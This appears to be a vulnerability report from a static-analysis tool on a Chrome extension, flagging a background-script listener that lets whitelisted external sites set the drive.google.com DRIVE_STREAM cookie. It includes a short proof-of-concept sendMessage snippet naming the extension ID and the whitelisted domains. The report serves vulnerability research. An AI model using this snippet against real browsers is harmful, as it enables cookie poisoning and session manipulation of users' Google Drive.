# CoCo Analysis: cfakdddemgaldaenbeccjmpdmdahcoji

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cfakdddemgaldaenbeccjmpdmdahcoji/opgen_generated_files/bg.js
Line 981: `cookie.value = request.cookie;`

**Code:**

```javascript
// Background script (bg.js) - Lines 975-991
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
    switch (request.type) {
        case "dv":
            var cookie = {};
            cookie.url = "https://drive.google.com";
            cookie.name = "DRIVE_STREAM";
            cookie.value = request.cookie; // ← attacker-controlled
            cookie.domain = "drive.google.com";
            cookie.sameSite = "no_restriction";
            cookie.secure = true;
            chrome.cookies.set(cookie); // Privileged API sink
            sendResponse({
                msg: "dv"
            });
            break;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From any of the whitelisted domains in externally_connectable:
// - *://174.138.17.52/*
// - *://dutaxx1.com/*
// - *://188.166.222.161/*

// Execute this code on the whitelisted domain:
chrome.runtime.sendMessage(
    'cfakdddemgaldaenbeccjmpdmdahcoji', // Extension ID
    {
        type: "dv",
        cookie: "malicious_cookie_value_here"
    },
    function(response) {
        console.log("Cookie set:", response);
    }
);
```

**Impact:** Attacker can set arbitrary cookies for drive.google.com from whitelisted domains. This allows session hijacking or manipulation of Google Drive functionality by poisoning the DRIVE_STREAM cookie with attacker-controlled values. The extension has the necessary "cookies" permission and access to drive.google.com, making this a complete attack path.
